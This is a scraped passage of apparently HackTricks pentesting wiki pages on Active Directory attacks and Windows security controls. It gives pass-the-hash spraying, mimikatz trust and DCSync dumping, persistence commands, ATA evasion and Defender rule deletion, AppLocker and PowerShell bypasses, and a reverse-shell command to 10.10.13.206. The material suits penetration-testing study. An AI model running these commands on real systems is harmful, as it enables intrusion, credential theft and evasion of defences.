the\nticket itself is stolen\nand used to authenticate as its owner.\nPass the Ticket\nCredentials Reuse\nIf you have the\nhash\nor\npassword\nof a\nlocal administrato\nr you should try to\nlogin locally\nto other\nPCs\nwith it.\n# Local Auth Spray (once you found some local admin pass or hash)\n## --local-auth flag indicate to only try 1 time per machine\ncrackmapexec smb --local-auth\n10.10\n.10.10/23\n-u\nadministrator\n-H\n10298e182387f9cab376ecd08491764a0\n|\ngrep\n+\nNote that this is quite\nnoisy\nand\nLAPS\nwould\nmitigate\nit.\nMSSQL Abuse & Trusted Links\nIf a user has privileges to\naccess MSSQL instances\n, he could be able to use it to\nexecute commands\nin the MSSQL host (if running as SA),\nsteal\nthe NetNTLM\nhash\nor even perform a\nrelay\nattack\n.\nAlso, if a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to\nuse the trust relationship to execute queries also in the other instance\n. These trusts can be chained and at some point the user might be able to find a misconfigured database where he can execute commands.\nThe links between databases work even across forest trusts.\nMSSQL AD Abuse\nUnconstrained Delegation\nIf you find any Computer object with the attribute\nADS_UF_TRUSTED_FOR_DELEGATION\nand you have domain privileges in the computer, you will be able to dump TGTs from memory of every users that logins onto the computer.\nSo, if a\nDomain Admin logins onto the computer\n, you will be able to dump his TGT and impersonate him using\nPass the Ticket\n.\nThanks to constrained delegation you could even\nautomatically compromise a Print Server\n(hopefully it will be a DC).\nUnconstrained Delegation\nConstrained Delegation\nIf a user or computer is allowed for \"Constrained Delegation\" it will be able to\nimpersonate any user to access some services in a computer\n.\nThen, if you\ncompromise the hash\nof this user/computer you will be able to\nimpersonate any user\n(even domain admins) to access some services.\nConstrained Delegation\nResourced-based Constrain Delegation\nIt's possible to gain code execution with\nelevated privileges on a remote computer if you have WRITE privilege\non that computer's AD object.\nResource-based Constrained Delegation\nACLs Abuse\nThe compromised user could have some\ninteresting privileges over some domain objects\nthat could let you\nmove\nlaterally/\nescalate\nprivileges.\nAbusing Active Directory ACLs/ACEs\nPrinter Spooler service abuse\nIf you can find any\nSpool service listening\ninside the domain, you may be able to\nabuse\nis to\nobtain new credentials\nand\nescalate privileges\n.\nMore information about how to abuse Spooler services here.\n‚Äã\nThird party sessions abuse\nIf\nother users\naccess\nthe\ncompromised\nmachine, it's possible to\ngather credentials from memory\nand even\ninject beacons in their processes\nto impersonate them.\nUsually users will access the system via RDP, so here you have how to performa couple of attacks over third party RDP sessions:\nRDP Sessions Abuse\nLAPS\nLAPS\nallows you to\nmanage the local Administrator password\n(which is\nrandomised\n, unique, and\nchanged regularly\n) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. If you have\nenough permission to read these passwords you could move to other computers\n.\nLAPS\nCertificate Theft\nGathering certificates from the compromised machine could be a way to escalate privileges inside the environment:\nAD CS Certificate Theft\nCertificate Templates Abuse\nIf vulnerable templates are configured it's possible to abuse them to escalate privileges:\nAD CS Domain Escalation\nPost-exploitation with high privilege account\nDumping Domain Credentials\nOnce you get\nDomain Admin\nor even better\nEnterprise Admin\nprivileges, you can\ndump\nthe\ndomain database\n:\nntds.dit\n.\n‚Äã\nMore information about DCSync attack can be found here\n.\n‚Äã\nMore information about how to steal the NTDS.dit can be found here\n‚Äã\nPrivesc as Persistence\nSome of the techniques discussed before can be used for persistence.\nFor example you could:\nMake users vulnerable to\nKerberoast\n‚Äã\nSet-DomainObject\n-\nIdentity <username>\n-\nSet\n@\n{\nserviceprincipalname=\n\"fake/NOTHING\"\n}\nr\nMake users vulnerable to\nASREPRoast\n‚Äã\nSet-DomainObject\n-\nIdentity <username>\n-XOR\n@\n{\nUserAccountControl=4194304\n}\nGrant\nDCSync\nprivileges to a user\nAdd-DomainObjectAcl\n-\nTargetIdentity\n\"DC=SUB,DC=DOMAIN,DC=LOCAL\"\n-\nPrincipalIdentity bfarmer\n-\nRights DCSync\nSilver Ticket\nThe Silver ticket attack is based on\ncrafting a valid TGS for a service once the NTLM hash of service is owned\n(like the\nPC account hash\n). Thus, it is possible to\ngain access to that service\nby forging a custom TGS\nas any user\n(like privileged access to a computer).\nSilver Ticket\nGolden Ticket\nA valid\nTGT as any user\ncan be created\nusing the NTLM hash of the krbtgt AD account\n. The advantage of forging a TGT instead of TGS is being\nable to access any service\n(or machine) in the domain ad the impersonated user.\nGolden Ticket\nDiamond Ticket\nThese are like golden tickets forged in a way that\nbypasses common golden tickets detection mechanisms.\nDiamond Ticket\nCertificates Account Persistence\nHaving certificates of an account or being able to request them\nis a very good way to be able to persist in the users account (even if he changes the password):\nAD CS Account Persistence\nCertificates Domain Persistence\nUsing certificates is also possible to persist with high privileges inside the domain:\nAD CS Domain Persistence\nAdminSDHolder Group\nThe Access Control List (ACL) of the\nAdminSDHolder\nobject is used as a template to\ncopy\npermissions\nto\nall ‚Äúprotected groups‚Äù\nin Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins, Backup Operators and krbtgt.\nBy default, the ACL of this group is copied inside all the \"protected groups\". This is done to avoid intentional or accidental changes to these critical groups. However, if an attacker\nmodifies the ACL\nof the group\nAdminSDHolder\nfor example, giving full permissions to a regular user, this user will have full permissions on all the groups inside the protected group (in an hour).\nAnd if someone tries to delete this user from the Domain Admins (for example) in an hour or less, the user will be back in the group.\nMore information about AdminDSHolder Group here.\n‚Äã\nDSRM Credentials\nThere is a\nlocal administrator\naccount inside each\nDC\n. Having admin privileges in this machine, you can use mimikatz to\ndump the local Administrator hash\n. Then, modifying a registry to\nactivate this password\nso you can remotely access to this local Administrator user.\nDSRM Credentials\nACL Persistence\nYou could\ngive\nsome\nspecial permissions\nto a\nuser\nover some specific domain objects that will let the user\nescalate privileges in the future\n.\nAbusing Active Directory ACLs/ACEs\nSecurity Descriptors\nThe\nsecurity descriptors\nare used to\nstore\nthe\npermissions\nan\nobject\nhave\nover\nan\nobject\n. If you can just\nmake\na\nlittle change\nin the\nsecurity descriptor\nof an object, you can obtain very interesting privileges over that object without needing to be member of a privileged group.\nSecurity Descriptors\nSkeleton Key\nModify LSASS\nin memory to create a\nmaster password\nthat will work for any account in the domain.\nSkeleton Key\nCustom SSP\n‚Äã\nLearn what is a SSP (Security Support Provider) here.\nYou can create you\nown SSP\nto\ncapture\nin\nclear text\nthe\ncredentials\nused to access the machine.\\\nCustom SSP\nDCShadow\nIt registers a\nnew Domain Controller\nin the AD and uses it to\npush attributes\n(SIDHistory, SPNs...) on specified objects\nwithout\nleaving any\nlogs\nregarding the\nmodifications\n. You\nneed DA\nprivileges and be inside the\nroot domain\n.\nNote that if you use wrong data, pretty ugly logs will appear.\nDCShadow\nLAPS Persistence\nPreviously we have discussed about how to escalate privileges if you have\nenough permission to read LAPS passwords\n. However, these passwords can also be used to\nmaintain persistence\n.\nCheck:\nLAPS\nForest Privilege Escalation - Domain Trusts\nMicrosoft considers that the\ndomain isn't a Security Boundary\n, the\nForest is the security Boundary\n. This means that\nif you compromise a domain inside a Forest you might be able to compromise the entire Forest\n.\nBasic Information\nAt a high level, a\ndomain trust\nestablishes the ability for\nusers in one domain to authenticate\nto resources or act as a\nsecurity principal\nin another domain\n.\nEssentially, all a trust does is\nlinking up the authentication systems of two domains\nand allowing authentication traffic to flow between them through a system of referrals.\nWhen\n2 domains trust each other they exchange keys\n, these\nkeys\nare going to be\nsaved\nin the\nDCs\nof\neach domains\n(\n2 keys per trust direction, latest and previous\n) and the keys will be the base of the trust.\nWhen a\nuser\ntries to\naccess\na\nservice\non the\ntrusting domain\nit will request an\ninter-realm TGT\nto the DC of its domain. The DC wills serve the client this\nTGT\nwhich would be\nencrypted/signed\nwith the\ninter-realm\nkey\n(the key both domains\nexchanged\n). Then, the\nclient\nwill\naccess\nthe\nDC of the other domain\nand will\nrequest\na\nTGS\nfor the service using the\ninter-realm TGT\n. The\nDC\nof the trusting domain will\ncheck\nthe\nkey\nused, if it's ok, it will\ntrust everything in that ticket\nand will serve the TGS to the client.\nDifferent trusts\nIt's important to notice that\na trust can be 1 way or 2 ways\n. In the 2 ways options, both domains will trust each other, but in the\n1 way\ntrust relation one of the domains will be the\ntrusted\nand the other the\ntrusting\ndomain. In the last case,\nyou will only be able to access resources inside the trusting domain from the trusted one\n.\nIf Domain A trusts Domain B, A is the trusting domain and B ins the trusted one. Moreover, in\nDomain A\n, this would be an\nOutbound trust\n; and in\nDomain B\n, this would be an\nInbound trust\n.\nDifferent trusting relationships\nParent-Child\n‚Äì part of the same forest ‚Äì a child domain retains an implicit two-way transitive trust with its parent. This is probably the most common type of trust that you‚Äôll encounter.\nCross-link\n‚Äì aka a ‚Äúshortcut trust‚Äù between child domains to improve referral times. Normally referrals in a complex forest have to filter up to the forest root and then back down to the target domain, so for a geographically spread out scenario, cross-links can make sense to cut down on authentication times.\nExternal\n‚Äì an implicitly non-transitive trust created between disparate domains. ‚Äú\nExternal trusts provide access to resources in a domain outside of the forest that is not already joined by a forest trust.\n‚Äù External trusts enforce SID filtering, a security protection covered later in this post.\nTree-root\n‚Äì an implicit two-way transitive trust between the forest root domain and the new tree root you‚Äôre adding. I haven‚Äôt encountered tree-root trusts too often, but from the\nMicrosoft documentation\n, they‚Äôre created when you create a new domain tree in a forest. These are intra-forest trusts, and they\npreserve two-way transitivity\nwhile allowing the tree to have a separate domain name (instead of child.parent.com).\nForest\n‚Äì a transitive trust between two forest root domain. Forest trusts also enforce SID filtering.\nMIT\n‚Äì a trust with a non-Windows\nRFC4120-compliant\nKerberos domain. I hope to dive more into MIT trusts in the future.\nOther differences in\ntrusting relationships\nA trust relationship can also be\ntransitive\n(A trust B, B trust C, then A trust C) or\nnon-transitive\n.\nA trust relationship can be set up as\nbidirectional trust\n(both trust each other) or as\none-way trust\n(only one of them trust the other).\nAttack Path\n1.\nEnumerate\nthe trusting relationships\n2.\nCheck if any\nsecurity principal\n(user/group/computer) has\naccess\nto resources of the\nother domain\n, maybe by ACE entries or by being in groups of the other domain. Look for\nrelationships across domains\n(the trust was created for this probably).\n1.\nkerberoast in this case could be another option.\n3.\nCompromise\nthe\naccounts\nwhich can\npivot\nthrough domains.\nThere are three\nmain\nways that security principals (users/groups/computer) from one domain can have access into resources in another foreign/trusting domain:\nThey can be added to\nlocal groups\non individual machines, i.e. the local ‚ÄúAdministrators‚Äù group on a server.\nThey can be added to\ngroups in the foreign domain\n. There are some caveats depending on trust type and group scope, described shortly.\nThey can be added as principals in an\naccess control list\n, most interesting for us as principals in\nACEs\nin a\nDACL\n. For more background on ACLs/DACLs/ACEs, check out the ‚Äú\nAn ACE Up The Sleeve\n‚Äù whitepaper.\nChild-to-Parent forest privilege escalation\nGet-DomainTrust\n‚Äã\nSourceName      : sub.domain.local    --> current domain\nTargetName      : domain.local        --> foreign domain\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest\nTrustDirection  : Bidirectional       --> Trust direction (2ways in this case)\nWhenCreated     : 2/19/2021 1:28:00 PM\nWhenChanged     : 2/19/2021 1:28:00 PM\nThere are\n2 trusted keys\n, one for\nChild --> Parent\nand another one for\nParent\n-->\nChild\n.\nYou can the one used by the current domain them with:\nInvoke-Mimikatz\n-Command\n'\"lsadump::trust /patch\"'\n-ComputerName\ndc.my.domain.local\nInvoke-Mimikatz\n-Command\n'\"lsadump::dcsync /user:dcorp\\mcorp$\"'\nSID-History Injection\nEscalate as Enterprise admin to the child/parent domain abusing the trust with SID-History injection:\nSID-History Injection\nExploit writeable Configuration NC\nThe Configuration NC is the primary repository for configuration information for a forest and is replicated to every DC in the forest. Additionally, every writable DC (not read-only DCs) in the forest holds a writable copy of the Configuration NC. Exploiting this require running as SYSTEM on a (child) DC.\nIt is possible to compromise the root domain in various ways covered below.\nLink GPO to root DC site\nThe Sites container in Configuration NC contains all sites of the domain-joined computers in the AD forest. It is possible to link GPOs to sites when running as SYSTEM on any DC in the forest, including the site(s) of the forest root DCs, and thereby compromise these.\nMore details can be read here\nBypass SID filtering research\n.\nCompromise any gMSA in the forest\nThe attack depends on privileged gMSAs in the targeted domain.\nThe KDS Root key, which is used to calculate the password of gMSAs in the forest, is stored in the Configuration NC. When running as SYSTEM on any DC in the forest, one can read out the KDS Root key and calculate the password of any gMSA in the forest.\nMore details can be read here:\nGolden gMSA trust attack from child to parent\n.\nSchema change attack\nThe attack requires the attacker to wait for new privileged AD objects to be created.\nWhen running as SYSTEM on any DC in the forest, one can grant any user full control over all classes in the AD Schema. That control can be abused to create an ACE in the default security descriptor of any AD object that grants full control to a compromised principal. All new instances of the modified AD object types will have this ACE.\nMore details can be read here:\nSchema change trust attack from child to parent\n.\nFrom DA to EA with ADCS ESC5\nThe ADCS ESC5 (Vulnerable PKI Object Access Control) attacks abuse control over PKI objects to create a vulnerable certificate template that can be abused to authenticate as any user in the forest. Since all the PKI objects are stored in the Configuration NC, one can execute ESC5 if they have compromised any writable (child) DC in the forest.\nMore details can be read here:\nFrom DA to EA with ESC5\n‚Äã\nIn case the AD forest does not have ADCS, the attacker can create the necessary components as described here:\nEscalating from child domain‚Äôs admins to enterprise admins in 5 minutes by abusing AD CS, a follow up\n.\nExternal Forest Domain - One-Way (Inbound) or bidirectional\nGet-DomainTrust\nSourceName      : a\n.\ndomain\n.\nlocal\n--\n> Current domain\nTargetName      : domain\n.\nexternal\n--\n> Destination domain\nTrustType       : WINDOWS-ACTIVE_DIRECTORY\nTrustAttributes :\nTrustDirection  : Inbound\n--\n> Inboud trust\nWhenCreated     : 2/19/2021 10:50:56 PM\nWhenChanged     : 2/19/2021 10:50:56 PM\nIn this scenario\nyour domain is trusted\nby an external one giving you\nundetermined permissions\nover it. You will need to find\nwhich principals of your domain have which access over the external domain\nand then try to exploit it:\nExternal Forest Domain - OneWay (Inbound) or bidirectional\nExternal Forest Domain - One-Way (Outbound)\nGet-DomainTrust\n-\nDomain current\n.\nlocal\n‚Äã\nSourceName      : current\n.\nlocal\n--\n> Current domain\nTargetName      : external\n.\nlocal\n--\n> Destination domain\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : FOREST_TRANSITIVE\nTrustDirection  : Outbound\n--\n> Outbound trust\nWhenCreated     : 2/19/2021 10:15:24 PM\nWhenChanged     : 2/19/2021 10:15:24 PM\nIn this scenario\nyour domain\nis\ntrusting\nsome\nprivileges\nto principal from a\ndifferent domains\n.\nHowever, when a\ndomain is trusted\nby the trusting domain, the trusted domain\ncreates a user\nwith a\npredictable name\nthat uses as\npassword the trusted password\n. Which means that it's possible to\naccess a user from the trusting domain to get inside the trusted one\nto enumerate it and try to escalate more privileges:\nExternal Forest Domain - One-Way (Outbound)\nAnother way to compromise the trusted domain is to find a\nSQL trusted link\ncreated in the\nopposite direction\nof the domain trust (which isn't very common).\nAnother way to compromise the trusted domain is to wait in a machine where a\nuser from the trusted domain can access\nto login via\nRDP\n. Then, the attacker could inject code in the RDP session process and\naccess the origin domain of the victim\nfrom there.\nMoreover, if the\nvictim mounted his hard drive\n, from the\nRDP session\nprocess the attacker could store\nbackdoors\nin the\nstartup folder of the hard drive\n. This technique is called\nRDPInception.\nRDP Sessions Abuse\nDomain trust abuse mitigation\nSID Filtering:\nAvoid attacks which abuse SID history attribute across forest trust.\nEnabled by default on all inter-forest trusts. Intra-forest trusts are assumed secured by default (MS considers forest and not the domain to be a security boundary).\nBut, since SID filtering has potential to break applications and user access, it is often disabled.\nSelective Authentication\nIn an inter-forest trust, if Selective Authentication is configured, users between the trusts will not be automatically authenticated. Individual access to domains and servers in the trusting domain/forest should be given.\nDoes not prevent writeable Configration NC exploitation and trust account attack.\n‚Äã\nMore information about domain trusts in ired.team.\n‚Äã\nAD -> Cloud & Cloud -> AD\nAzure AD Connect - Hybrid Identity\nHackTricks Cloud\nSome General Defenses\n‚Äã\nLearn more about how to protect credentials here.\nPlease, find some migrations against each technique in the description of the technique.\nNot allow Domain Admins to login on any other hosts apart from Domain Controllers\nNever run a service with DA privileges\nIf you need domain admin privileges, limit the time:\nAdd-ADGroupMember -Identity ‚ÄòDomain Admins‚Äô -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)\nDeception\nPassword does not expire\nTrusted for Delegation\nUsers with SPN\nPassword in description\nUsers who are members of high privilege groups\nUsers with ACL rights over other users, groups or containers\nComputer objects\n...\n‚Äã\nhttps://github.com/samratashok/Deploy-Deception\n‚Äã\nCreate-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose\nHow to identify deception\nFor user objects:\nObjectSID (different from the domain)\nlastLogon, lastlogontimestamp\nLogoncount (very low number is suspicious)\nwhenCreated\nBadpwdcount (very low number is suspicious)\nGeneral:\nSome solutions fill with information in all the possible attributes. For example, compare the attributes of a computer object with the attribute of a 100% real computer object like DC. Or users against the RID 500 (default admin).\nCheck if something is too good to be true\n‚Äã\nhttps://github.com/JavelinNetworks/HoneypotBuster\n‚Äã\nBypassing Microsoft ATA detection\nUser enumeration\nATA only complains when you try to enumerate sessions in the DC, so if you don't look for sessions in the DC but in the rest of the hosts, you probably won't get detected.\nTickets impersonation creation (Over pass the hash, golden ticket...)\nAlways create the tickets using the\naes\nkeys also because what ATA identifies as malicious is the degradation to NTLM.\nDCSync\nIf you don't execute this from a Domain Controller, ATA is going to catch you, sorry.\nMore Tools\n‚Äã\nPowershell script to do domain auditing automation\n‚Äã\n‚Äã\nPython script to enumerate active directory\n‚Äã\n‚Äã\nPython script to enumerate active directory\n‚Äã\nReferences\n‚Äã\nhttp://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nWindows C Payloads\nNext\nAbusing Active Directory ACLs/ACEs\nLast modified\n5mo ago"
    },
    {
        "title": "Windows Security Controls",
        "url": "https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs",
        "text": "Windows Security Controls\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n\u0000\u0000‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nAppLocker Policy\nAn application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization.\n‚Äã\nAppLocker\nis Microsoft's\napplication whitelisting solution\nand gives system administrators control over\nwhich applications and files users can run\n. It provides\ngranular control\nover executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.\nIt is common for organizations to\nblock cmd.exe and PowerShell.exe\nand write access to certain directories,\nbut this can all be bypassed\n.\nCheck\nCheck which files/extensions are blacklisted/whitelisted:\nGet-ApplockerPolicy\n-\nEffective\n-\nxml\n‚Äã\nGet-AppLockerPolicy\n-\nEffective\n|\nselect\n-\nExpandProperty RuleCollections\n‚Äã\n$a\n=\nGet-ApplockerPolicy\n-\neffective\n$a\n.\nrulecollections\nAppLocker rules applied to a host can also be\nread from the local registry\nat\nHKLM\\Software\\Policies\\Microsoft\\Windows\\SrpV2\n.\nBypass\nUseful\nWritable folders\nto bypass AppLocker Policy: If AppLocker is allowing to execute anything inside\nC:\\Windows\\System32\nor\nC:\\Windows\nthere are\nwritable folders\nyou can use to\nbypass this\n.\nC:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\nC:\\Windows\\System32\\spool\\drivers\\color\nC:\\Windows\\Tasks\nC:\\windows\\tracing\nCommonly\ntrusted\n\"LOLBAS's\"\nbinaries can be also useful to bypass AppLocker.\nPoorly written rules could also be bypassed\nFor example,\n<FilePathCondition Path=\"%OSDRIVE%*\\allowed*\"/>\n, you can create a\nfolder called\nallowed\nanywhere and it will be allowed.\nOrganizations also often focus on\nblocking the\n%System32%\\WindowsPowerShell\\v1.0\\powershell.exe\nexecutable\n, but forget about the\nother\nPowerShell executable locations\nsuch as\n%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\nor\nPowerShell_ISE.exe\n.\nDLL enforcement very rarely enabled\ndue to the additional load it can put on a system, and the amount of testing required to ensure nothing will break. So using\nDLLs as backdoors will help bypassing AppLocker\n.\nYou can use\nReflectivePick\nor\nSharpPick\nto\nexecute Powershell\ncode in any process and bypass AppLocker. For more info check:\nhttps://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode\n.\nCredentials Storage\nSecurity Accounts Manager (SAM)\nLocal credentials are present in this file, the passwords are hashed.\nLocal Security Authority (LSA) - LSASS\nThe\ncredentials\n(hashed) are\nsaved\nin the\nmemory\nof this subsystem for Single Sign-On reasons.\nLSA\nadministrates the local\nsecurity policy\n(password policy, users permissions...),\nauthentication\n,\naccess tokens\n...\nLSA will be the one that will\ncheck\nfor provided credentials inside the\nSAM\nfile (for a local login) and\ntalk\nwith the\ndomain controller\nto authenticate a domain user.\nThe\ncredentials\nare\nsaved\ninside the\nprocess LSASS\n: Kerberos tickets, hashes NT and LM, easily decrypted passwords.\nLSA secrets\nLSA could save in disk some credentials:\nPassword of the computer account of the Active Directory (unreachable domain controller).\nPasswords of the accounts of Windows services\nPasswords for scheduled tasks\nMore (password of IIS applications...)\nNTDS.dit\nIt is the database of the Active Directory. It is only present in Domain Controllers.\nDefender\n\u0000‚Äã\nMicrosoft Defender\n**** is an Antivirus that is available in Windows 10 and Windows 11, and in versions of Windows Server. It\nblocks\ncommon pentesting tools such as\nWinPEAS\n. However, there are ways to\nbypass these protections\n.\nCheck\nTo check the\nstatus\nof\nDefender\nyou can execute the PS cmdlet\nGet-MpComputerStatus\n(check the value of\nRealTimeProtectionEnabled\nto know if it's active):\nPS\nC:\\>\nGet-MpComputerStatus\n‚Äã\n[...]\nAntispywareEnabled              : True\nAntispywareSignatureAge         : 1\nAntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM\nAntispywareSignatureVersion     : 1\n.\n323\n.\n392\n.\n0\nAntivirusEnabled                : True\n[...]\nNISEnabled                      : False\nNISEngineVersion                : 0\n.\n0\n.\n0\n.\n0\n[...]\nRealTimeProtectionEnabled       : True\nRealTimeScanDirection           : 0\nPSComputerName                  :\nTo enumerate it you could also run:\nWMIC /Node:localhost /Namespace:\n\\\\\nroot\n\\\nSecurityCenter2 Path AntiVirusProduct Get displayName /Format:List\nwmic /namespace:\n\\\\\nroot\n\\\nsecuritycenter2 path antivirusproduct\nsc query windefend\n‚Äã\n#Delete all rules of Defender (useful for machines without internet access)\n\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\"\n-RemoveDefinitions\n-All\nEFS (Encrypted File System)\nEFS works by encrypting a file with a bulk\nsymmetric key\n, also known as the File Encryption Key, or\nFEK\n. The FEK is then\nencrypted\nwith a\npublic key\nthat is associated with the user who encrypted the file, and this encrypted FEK is stored in the $EFS\nalternative data stream\nof the encrypted file. To decrypt the file, the EFS component driver uses the\nprivate key\nthat matches the EFS digital certificate (used to encrypt the file) to decrypt the symmetric key that is stored in the $EFS stream. From\nhere\n.\nExamples of files being decrypted without the user asking for it:\nFiles and folders are decrypted before being copied to a volume formatted with another file system, like\nFAT32\n.\nEncrypted files are copied over the network using the SMB/CIFS protocol, the files are decrypted before they are sent over the network.\nThe encrypted files using this method can be\ntansparently access by the owner user\n(the one who has encrypted them), so if you can\nbecome that user\nyou can decrypt the files (changing the password of the user and logins as him won't work).\nCheck EFS info\nCheck if a\nuser\nhas\nused\nthis\nservice\nchecking if this path exists:\nC:\\users\\<username>\\appdata\\roaming\\Microsoft\\Protect\nCheck\nwho\nhas\naccess\nto the file using cipher /c <file>\nYou can also use\ncipher /e\nand\ncipher /d\ninside a folder to\nencrypt\nand\ndecrypt\nall the files\nDecrypting EFS files\nBeing Authority System\nThis way requires the\nvictim user\nto be\nrunning\na\nprocess\ninside the host. If that is the case, using a\nmeterpreter\nsessions you can impersonate the token of the process of the user (\nimpersonate_token\nfrom\nincognito\n). Or you could just\nmigrate\nto process of the user.\nKnowing the users password\nhowto ~ decrypt EFS files ¬∑ gentilkiwi/mimikatz Wiki\nGitHub\nGroup Managed Service Accounts (gMSA)\nIn most of the infrastructures, service accounts are typical user accounts with ‚Äú\nPassword never expire\n‚Äù option. Maintaining these accounts could be a real mess and that's why Microsoft introduced\nManaged Service Accounts:\nNo more password management. It uses a complex, random, 240-character password and changes that automatically when it reaches the domain or computer password expire date.\nIt is uses Microsoft Key Distribution Service (KDC) to create and manage the passwords for the gMSA.\nIt cannot be lock out or use for interactive login\nSupports to share across multiple hosts\nCan use to run schedule tasks (Managed service accounts do not support to run schedule tasks)\nSimplified SPN Management ‚Äì System will automatically change the SPN value if\nsAMaccount\ndetails of the computer change or DNS name property change.\ngMSA accounts have their passwords stored in a LDAP property called\nmsDS-ManagedPassword\nwhich\nautomatically\nget\nresets\nby the DC‚Äôs every 30 days, are\nretrievable\nby\nauthorized administrators\nand by the\nservers\nwho they are installed on.\nmsDS-ManagedPassword\nis an encrypted data blob called\nMSDS-MANAGEDPASSWORD_BLOB\nand it‚Äôs only retrievable when the connection is secured,\nLDAPS\nor when the authentication type is ‚ÄòSealing & Secure‚Äô for an example.\nImage from https://cube0x0.github.io/Relaying-for-gMSA/\nSo, if gMSA is being used, find if it has\nspecial privileges\nand also check if you have\npermissions\nto\nread\nthe password of the services.\nYou can read this password with\nGMSAPasswordReader\n:\n/GMSAPasswordReader --AccountName jkohler\nAlso, check this\nweb page\nabout how to perform a\nNTLM relay attack\nto\nread\nthe\npassword\nof\ngMSA\n.\nLAPS\n****\nLocal Administrator Password Solution (LAPS)\nallows you to\nmanage the local Administrator password\n(which is\nrandomised\n, unique, and\nchanged regularly\n) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. If your user is given enough permissions you might be able to read the passwords of the local admins.\nLAPS\nPS Constrained Language Mode\nPowerShell ****\nConstrained Language Mode\nlocks down many of the features\nneeded to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.\nCheck\n$ExecutionContext\n.\nSessionState\n.\nLanguageMode\n#Values could be: FullLanguage or ConstrainedLanguage\nBypass\n#Easy bypass\nPowershell\n-\nversion 2\nIn current Windows that Bypass won't work but you can use\nPSByPassCLM\n.\nTo compile it you may need\nto\nAdd a Reference\n->\nBrowse\n->\nBrowse\n-> add\nC:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0\\31bf3856ad364e35\\System.Management.Automation.dll\nand\nchange the project to .Net4.5\n.\nDirect bypass:\nC:\n\\\nWindows\n\\\nMicrosoft.NET\n\\\nFramework64\n\\\nv4.0.30319\n\\\nInstallUtil.exe /logfile\n=\n/LogToConsole\n=\ntrue /U c:\n\\\ntemp\n\\\npsby.exe\nReverse shell:\nC:\n\\\nWindows\n\\\nMicrosoft.NET\n\\\nFramework64\n\\\nv4.0.30319\n\\\nInstallUtil.exe /logfile\n=\n/LogToConsole\n=\ntrue /revshell\n=\ntrue /rhost\n=\n10.10\n.13.206 /rport\n=\n443\n/U c:\n\\\ntemp\n\\\npsby.exe\nYou can use\nReflectivePick\nor\nSharpPick\nto\nexecute Powershell\ncode in any process and bypass the constrained mode. For more info check:\nhttps://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode\n.\nPS Execution Policy\nBy default it is set to\nrestricted.\nMain ways to bypass this policy:\n1¬∫ Just\ncopy\nand paste inside the interactive\nPS\nconsole\n2¬∫ Read en Exec\nGet-Content\n.\nrunme\n.\nps1\n|\nPowerShell\n.\nexe\n-\nnoprofile\n-\n3¬∫ Read and Exec\nGet-Content\n.\nrunme\n.\nps1\n|\nInvoke-Expression\n4¬∫ Use other execution policy\nPowerShell\n.\nexe\n-\nExecutionPolicy Bypass\n-\nFile\n.\nrunme\n.\nps1\n5¬∫ Change users execution policy\nSet-Executionpolicy\n-\nScope CurrentUser\n-\nExecutionPolicy UnRestricted\n6¬∫ Change execution policy\nfor\nthis session\nSet-ExecutionPolicy\nBypass\n-\nScope\nProcess\n7¬∫ Download and 